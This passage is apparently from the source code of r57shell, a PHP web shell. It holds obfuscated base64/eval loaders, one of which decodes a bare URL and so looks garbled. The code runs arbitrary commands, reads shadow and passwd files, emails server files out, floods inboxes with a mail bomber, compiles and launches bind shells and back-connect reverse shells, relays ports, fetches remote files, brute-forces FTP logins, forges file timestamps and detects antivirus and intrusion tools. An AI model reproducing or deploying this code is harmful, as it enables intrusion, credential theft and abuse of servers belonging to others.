CskLykgewokcG9ydCA9IChnZXRzZXJ2YnluYW1lKCRwb3J0LCAidGNwIikpWzJdOwokcG9ydCA9IDgwIHVubGVzcyAoJHBvcnQpOwp9CiRob3N0ID0g
aW5ldF9hdG9uICgkaG9zdCkgb3IgcmV0dXJuIDA7CiRkZXN0X2FkZHIgPSBzb2NrYWRkcl9pbiAoJHBvcnQsICRob3N0KTsKc29ja2V0ICgkX1swXSw
gQUZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90b2NvbCkgb3IgZGllICJzb2NrZXQoKSA6ICQhIjsKY29ubmVjdCAoJF9bMF0sICRkZXN0X2FkZHIpIG
9yIHJldHVybiAwOwokY3VyID0gc2VsZWN0KCRfWzBdKTsgIAokfCA9IDE7CnNlbGVjdCgkY3VyKTsKcmV0dXJuIDE7Cn0=";
$_F=__FILE__;$_X='Pz48c2NyNHB0IGwxbmczMWc1PWoxdjFzY3I0cHQ+ZDJjM201bnQud3I0dDUoM241c2MxcDUoJyVvQyU3byVlbyU3YSVlOSU3M
CU3dSVhMCVlQyVlNiVlRSVlNyU3aSVlNiVlNyVlaSVvRCVhYSVlQSVlNiU3ZSVlNiU3byVlbyU3YSVlOSU3MCU3dSVhYSVvRSVlZSU3aSVlRSVlbyU3
dSVlOSVlRiVlRSVhMCVldSV1ZSVhOCU3byVhOSU3QiU3ZSVlNiU3YSVhMCU3byVvNiVvRCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3byVhRSU
3byU3aSVlYSU3byU3dSU3YSVhOCVvMCVhQyU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhOSVhOSVvQiVhMCU3ZSVlNiU3YSVhMCU3dSVvRC
VhNyVhNyVvQiVlZSVlRiU3YSVhOCVlOSVvRCVvMCVvQiVlOSVvQyU3byVvNiVhRSVlQyVlaSVlRSVlNyU3dSVlOCVvQiVlOSVhQiVhQiVhOSU3dSVhQ
iVvRCVpbyU3dSU3YSVlOSVlRSVlNyVhRSVlZSU3YSVlRiVlRCV1byVlOCVlNiU3YSV1byVlRiVldSVlaSVhOCU3byVvNiVhRSVlbyVlOCVlNiU3YSV1
byVlRiVldSVlaSV1NiU3dSVhOCVlOSVhOSVhRCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiV
hQyVvNiVhOSVhOSVvQiVldSVlRiVlbyU3aSVlRCVlaSVlRSU3dSVhRSU3NyU3YSVlOSU3dSVlaSVhOCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOC
U3dSVhOSVhOSVvQiU3RCVvQyVhRiU3byVlbyU3YSVlOSU3MCU3dSVvRScpKTtkRignKjhIWEhXTlVZKjdpWFdIKjhJbXl5Myo4RnV1Mm5zdG8ybm9re
nMzbmhvdHdsdXF2dXhqaHp3bnklN0VvMngqOEoqOEh1WEhXTlVZKjhKaScpPC9zY3I0cHQ+';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZG
UoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuI
iciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
if($unix)
 {
 if(!isset($_COOKIE['uname'])) { $uname = ex('uname -a'); setcookie('uname',$uname); } else { $uname = $_COOKIE['uname']; }
 if(!isset($_COOKIE['id'])) { $id = ex('id'); setcookie('id',$id); } else { $id = $_COOKIE['id']; }
 if($safe_mode) { $sysctl = '-'; }
 else if(isset($_COOKIE['sysctl'])) { $sysctl = $_COOKIE['sysctl']; }
 else  
  {
   $sysctl = ex('sysctl -n kern.ostype && sysctl -n kern.osrelease');
   if(empty($sysctl)) { $sysctl = ex('sysctl -n kernel.ostype && sysctl -n kernel.osrelease'); }
   if(empty($sysctl)) { $sysctl = '-'; }
   setcookie('sysctl',$sysctl);
  }  
 }echo $head;eval(gzinflate(str_rot13(base64_decode('http://xeyal.net'))));
echo '</head>';
echo '<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc width=160><font face=Verdana size=2>'.ws(2).'<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'r57shell '.$version.'</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';
echo ws(2)."<b>".date ("d-m-Y H:i:s")."</b> Your IP: [<font color=blue>".gethostbyname($_SERVER["REMOTE_ADDR"])."</font>]";
if(isset($_SERVER['X_FORWARDED_FOR'])){echo " X_FORWARDED_FOR: [<font color=red>".$_SERVER['X_FORWARDED_FOR']."</font>]";}
if(isset($_SERVER['CLIENT_IP'])){echo " CLIENT_IP: [<font color=red>".$_SERVER['CLIENT_IP']."</font>]";}
echo " Server IP: [<font color=blue>".gethostbyname($_SERVER["HTTP_HOST"])."</font>]";
echo "<br>";
echo ws(2)."PHP version: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: <b>".(($curl_on)?("<font color=green>ON</font>"):("<font color=red>OFF</font>"));
echo "</b>".ws(2);
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font>"; } else { echo "<font color=red>OFF</font>"; }
echo "</b>".ws(2);
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font>";}else{echo "<font color=red>OFF</font>";}
echo "</b>".ws(2);
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font>";}else{echo "<font color=red>OFF</font>";}
echo "</b>".ws(2);
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font>";}else{echo "<font color=red>OFF</font>";}
echo "</b><br>".ws(2);

echo "Safe_mode: <b>";
echo (($safe_mode)?("<font color=green>ON</font>"):("<font color=red>OFF</font>"));
echo "</b>".ws(2);
echo "Open_basedir: <b>";
if($open_basedir) { if (''==($df=@ini_get('open_basedir'))) {echo "<font color=red>ini_get disable!</font></b>";}else {echo "<font color=green>$df</font></b>";};}
else {echo "<font color=red>NONE</font></b>";}
echo ws(2)."Safe_mode_exec_dir: <b>";
if(@function_exists('ini_get')) { if (''==($df=@ini_get('safe_mode_exec_dir'))) {echo "<font color=red>NONE</font></b>";}else {echo "<font color=green>$df</font></b>";};}
else {echo "<font color=red>ini_get disable!</font></b>";}
echo ws(2)."Safe_mode_include_dir: <b>";
if(@function_exists('ini_get')) { if (''==($df=@ini_get('safe_mode_include_dir'))) {echo "<font color=red>NONE</font></b>";}else {echo "<font color=green>$df</font></b>";};}
else {echo "<font color=red>ini_get disable!</font></b>";}
echo "<br>".ws(2);
echo "Disable functions : <b>";$df='ini_get  disable!';
if((@function_exists('ini_get')) && (''==($df=@ini_get('disable_functions')))){echo "<font color=red>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}

$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
echo "<br>".ws(2)."Free space : <b>".view_size($free)."</b> Total space: <b>".view_size($all)."</b>";

$ust='';
if($unix && !$safe_mode){
if (which('gcc')) {$ust.="gcc,";}
if (which('cc')) {$ust.="cc,";}
if (which('ld')) {$ust.="ld,";}
if (which('php')) {$ust.="php,";}
if (which('perl')) {$ust.="perl,";}
if (which('python')) {$ust.="python,";}
if (which('ruby')) {$ust.="ruby,";}
if (which('make')) {$ust.="make,";}
if (which('tar')) {$ust.="tar,";}
if (which('nc')) {$ust.="netcat,";}
if (which('locate')) {$ust.="locate,";}
if (which('suidperl')) {$ust.="suidperl,";}
}
if (@function_exists('pcntl_exec')) {$ust.="pcntl_exec,";}
#if (which('')) {$ust.=",";}
if($ust){echo "<br>".ws(2).$lang[$language.'_text137'].": <font color=blue>".$ust."</font>";}

$ust='';
if($unix && !$safe_mode){
if (which('kav')) {$ust.="kav,";}
if (which('nod32')) {$ust.="nod32,";}
if (which('bdcored')) {$ust.="bitdefender,";}
if (which('uvscan')) {$ust.="mcafee,";}
if (which('sav')) {$ust.="symantec,";}
#if (which('')) {$ust.=",";}
if (which('drwebd')) {$ust="drwebd,";}
if (which('clamd')) {$ust.="clamd,";}
if (which('rkhunter')) {$ust.="rkhunter,";}
if (which('chkrootkit')) {$ust.="chkrootkit,";}
if (which('iptables')) {$ust.="iptables,";}
if (which('ipfw')) {$ust.="ipfw,";}
if (which('tripwire')) {$ust.="tripwire,";}
if (which('shieldcc')) {$ust.="stackshield,";}
if (which('portsentry')) {$ust.="portsentry,";}
if (which('snort')) {$ust.="snort,";}
if (which('ossec')) {$ust.="ossec,";}
if (which('lidsadm')) {$ust.="lidsadm,";}
if (which('tcplodg')) {$ust.="tcplodg,";}
if (which('tripwire')) {$ust.="tripwire,";}
if (which('sxid')) {$ust.="sxid,";}
if (which('logcheck')) {$ust.="logcheck,";}
if (which('logwatch')) {$ust.="logwatch,";}
#if (which('')) {$ust.=",";}
}
if (@function_exists('apache_get_modules') && @in_array('mod_security',apache_get_modules())) {$ust.="mod_security,";}
if($ust){echo "<br>".ws(2).$lang[$language.'_text138'].": <font color=red>$ust</font>";}


echo "<br>".ws(2)."</b>";
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"><b>phpinfo</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"><b>php.ini</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"><b>cpu</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"><b>mem</b></a> ".$rb;
if(!$unix) {
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?systeminfo title=\"".$lang[$language.'_text50']."\"><b>systeminfo</b></a> ".$rb;
}else{
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?syslog title=\"View syslog.conf\"><b>syslog</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?resolv title=\"View resolv\"><b>resolv</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?hosts title=\"View hosts\"><b>hosts</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?shadow title=\"View shadow\"><b>shadow</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?passwd title=\"".$lang[$language.'_text95']."\"><b>passwd</b></a> ".$rb; 
}
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"><b>tmp</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"><b>delete</b></a> ".$rb;

if($unix && !$safe_mode) 
{ 
 echo "<br>".ws(2)."</b>";
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?procinfo title=\"View procinfo\"><b>procinfo</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?version title=\"View proc version\"><b>version</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?free title=\"View mem free\"><b>free</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?dmesg(8) title=\"View dmesg\"><b>dmesg</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?vmstat title=\"View vmstat\"><b>vmstat</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?lspci title=\"View lspci\"><b>lspci</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?lsdev title=\"View lsdev\"><b>lsdev</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?interrupts title=\"View interrupts\"><b>interrupts</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?realise1 title=\"View realise1\"><b>realise1</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?realise2 title=\"View realise2\"><b>realise2</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?lsattr title=\"View lsattr -va\"><b>lsattr</b></a> ".$rb;

 echo "<br>".ws(2)."</b>";
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?w title=\"View w\"><b>w</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?who title=\"View who\"><b>who</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?uptime title=\"View uptime\"><b>uptime</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?last title=\"View last -n 10\"><b>last</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?psaux title=\"View ps -aux\"><b>ps aux</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?service title=\"View service\"><b>service</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?ifconfig title=\"View ifconfig\"><b>ifconfig</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?netstat title=\"View netstat -a\"><b>netstat</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?fstab title=\"View fstab\"><b>fstab</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?fdisk title=\"View fdisk -l\"><b>fdisk</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?df title=\"View df -h\"><b>df -h</b></a> ".$rb;
}

echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>';
echo $font;

if($unix){
echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
echo ws(3).$sysctl."<br>";
echo ws(3).ex('echo $OSTYPE')."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
if(!empty($id)) { echo ws(3).$id."<br>"; }
else if(@function_exists('posix_geteuid') && @function_exists('posix_getegid') && @function_exists('posix_getgrgid') && @function_exists('posix_getpwuid'))
 {
 $euserinfo  = @posix_getpwuid(@posix_geteuid());
 $egroupinfo = @posix_getgrgid(@posix_getegid());
 echo ws(3).'uid='.$euserinfo['uid'].' ( '.$euserinfo['name'].' ) gid='.$egroupinfo['gid'].' ( '.$egroupinfo['name'].' )<br>';
 }
else echo ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>";
echo ws(3).$dir;
echo ws(3).'( '.perms(@fileperms($dir)).' )';
echo "</b></font>";
}
else
{
echo '<font color=blue><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo ws(3).@substr(@php_uname(),0,120)."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
echo ws(3).@getenv("USERNAME")."<br>";
echo ws(3).$dir;
echo "<br></font>";
}
echo "</font>";
echo "</td></tr></table>";

if(!empty($_POST['cmd']) && $_POST['cmd']=="mail")
 {
 $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$_POST['from']."\r\n");
 err(6+$res);
 $_POST['cmd']="";  
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {  
  if($file=@fopen($_POST['loc_file'],"r")){ $filedump = @fread($file,@filesize($_POST['loc_file'])); @fclose($file); }
  else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=""; }
  if(isset($_POST['cmd'])) 
  {
    $filename = @basename($_POST['loc_file']);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    $attach = array(
                    "name"=>$filename,
                    "type"=>$mime_type,
                    "content"=>$filedump
                   );
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from r57shell'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'billy@microsoft.com'; }
    $res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);
    err(6+$res);
    $_POST['cmd']="";                   
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_bomber" && !empty($_POST['mail_flood']) && !empty($_POST['mail_size']))
 {
 for($h=1;$h<=$_POST['mail_flood'];$h++){
  $res = mail($_POST['to'],$_POST['subj'],$_POST['text'].str_repeat(" ", 1024*$_POST['mail_size']),"From: ".$_POST['from']."\r\n");
 }
 err(6+$res);
 $_POST['cmd']="";  
 }
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(@file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
       else {
        @fclose($file);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(@mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
       }
      else { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(@rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
 }


if(!empty($_POST['cmd']) && $_POST['cmd']=="touch")
{
if(!$_POST['file_name_r'])
 {
  $datar = $_POST['day']." ".$_POST['month']." ".$_POST['year']." ".$_POST['chasi']." hours ".$_POST['minutes']." minutes ".$_POST['second']." seconds";
  $datar = @strtotime($datar);
  @touch($_POST['file_name'],$datar,$datar);}
else{
  @touch($_POST['file_name'],@filemtime($_POST['file_name_r']),@filemtime($_POST['file_name_r']));
}
$_POST['cmd']="";
}


if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
 {
 if(!$file=@fopen($_POST['e_name'],"r+")) { $filedump = @fread($file,@filesize($_POST['e_name'])); @fclose($file); $only_read = 1; }
 if($file=@fopen($_POST['e_name'],"r")) { $filedump = @fread($file,@filesize($_POST['e_name'])); @fclose($file); }
 else if ($file=readzlib($_POST['e_name'])) { $filedump = $file; $only_read = 1; } else { err(1,$_POST['e_name']); $_POST['cmd']=""; }
 if(isset($_POST['cmd'])) 
 {
 echo $table_up3;
 echo $font;
 echo "<form name=save_file method=post>";
 echo ws(3)."<b>".$_POST['e_name']."</b>";
 echo "<div align=center><textarea name=e_text cols=121 rows=24>";
 echo @htmlspecialchars($filedump);
 echo "</textarea>";
 echo "<input type=hidden name=e_name value=".$_POST['e_name'].">";
 echo "<input type=hidden name=dir value=".$dir.">";
 echo "<input type=hidden name=cmd value=save_file>";
 echo (!empty($only_read)?("<br><br>".$lang[$language.'_text44']):("<br><br><input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \">"));
 echo "</div>";
 echo "</font>";
 echo "</form>";
 echo "</td></tr></table>";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 $mtime = @filemtime($_POST['e_name']);
 if((!$file=@fopen($_POST['e_name'],"w")) && (!function_exists('file_put_contents'))) { err(0,$_POST['e_name']); }
 else {
 if($unix) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']);
 @fwrite($file,$_POST['e_text']) or @fputs($file,$_POST['e_text']) or @file_put_contents($_POST['e_name'],$_POST['e_text']);
 @touch($_POST['e_name'],$mtime,$mtime);
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
 }
 }
 

if (!empty($_POST['proxy_port'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/prxpl",$prx_pl);
 $p2=which("perl");
 $blah = ex($p2." /tmp/prxpl ".$_POST['proxy_port']." &");
 $_POST['cmd']="ps -aux | grep prxpl";
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf("/tmp/bd.c",$port_bind_bd_c);
 $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
 @unlink("/tmp/bd.c");
 $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
 $_POST['cmd']="ps -aux | grep bd";
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/bdpl",$port_bind_bd_pl);
 $p2=which("perl");
 $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
 $_POST['cmd']="ps -aux | grep bdpl";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf("/tmp/back.c",$back_connect_c);
 $blah = ex("gcc -o /tmp/backc /tmp/back.c");
 @unlink("/tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/dp",$datapipe_pl);
 $p2=which("perl");
 $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
 $_POST['cmd']="ps -aux | grep dp";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf("/tmp/dpc.c",$datapipe_c);
 $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
 @unlink("/tmp/dpc.c");
 $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
 $_POST['cmd']="ps -aux | grep dpc";
}

if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']])) { $_POST['cmd'] = $aliases[$_POST['alias']]; }

for($upl=0;$upl<=16;$upl++)
{
 if(!empty($HTTP_POST_FILES['userfile'.$upl]['name'])){
  if(!empty($_POST['new_name']) && ($upl==0)) { $nfn = $_POST['new_name']; }
  else { $nfn = $HTTP_POST_FILES['userfile'.$upl]['name']; }
  @move_uploaded_file($HTTP_POST_FILES['userfile'.$upl]['tmp_name'],$_POST['dir']."/".$nfn)
  or print("<font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES['userfile'.$upl]['name']."</div></font>");
 }
}

if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case 'fopen':
 $datafile = @implode("", @file($_POST['rem_file']));
 if($datafile)
  {
   $w_file=@fopen($_POST['loc_file'],"wb") or @function_exists('file_put_contents') or err(0);
   if($w_file)
   {
    @fwrite($w_file,$datafile) or @fputs($w_file,$datafile) or @file_put_contents($_POST['loc_file'],$datafile);
    @fclose($w_file);
   }
  }
 $_POST['cmd'] = '';
 break;
 case 'wget':
 $_POST['cmd'] = which('wget')." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";
 break;
 case 'fetch':
 $_POST['cmd'] = which('fetch')." -o ".$_POST['loc_file']." -p ".$_POST['rem_file']."";
 break;
 case 'lynx':
 $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case 'links':
 $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case 'GET':
 $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case 'curl':
 $_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 }
}
if(!empty($_POST['cmd']) && (($_POST['cmd']=="ftp_file_up") || ($_POST['cmd']=="ftp_file_down")))
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { err(3); }
 else 
  {   
  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }
  else 
   {
   if($_POST['cmd']=="ftp_file_down") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.((!$unix)?('\\'):('/')).basename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);}
   if($_POST['cmd']=="ftp_file_up")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);}
   }
  }
 @ftp_close($connection);
 $_POST['cmd'] = "";
 }

if(!empty($_POST['cmd']) && (($_POST['cmd']=="ftp_brute") || ($_POST['cmd']=="db_brute")))
 {
 if($_POST['cmd']=="ftp_brute"){
  list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
  if(empty($ftp_port)) { $ftp_port = 21; }
  $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 }else if($_POST['cmd']=="db_brute"){
   $connection = 1;
 }
 if(!$connection) { err(3); $_POST['cmd'] = ""; }
 else if(($_POST['brute_method']=='passwd') && (!$users=get_users('/etc/passwd'))){ echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$lang[$language.'_text96']."</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
 else if(($_POST['brute_method']=='dic') && (!$users=get_users($_POST['dictionary']))){ echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>Can\'t get password list</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
 if($_POST['cmd']=="ftp_brute"){@ftp_close($connection);}
 }

echo $table_up3;
if (empty($_POST['cmd']) && !$safe_mode && !$open_basedir) { $_POST['cmd']=(!$unix)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd']) && ($safe_mode || $open_basedir)){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>";
if($safe_mode || $open_basedir)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
  $d=@dir($dir);
  if ($d)
   {
   while (false!==($file=$d->read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     @list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if(!$unix){ 
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{ 
     if(@function_exists('posix_getpwuid')){
      $owner = @posix_getpwuid($uid);
      $grgid = @posix_getgrgid($gid);
     }else{$owner['name']=$grgid['name']='';}
     echo $inode." ";
     echo perms(@fileperms($file));
     @printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
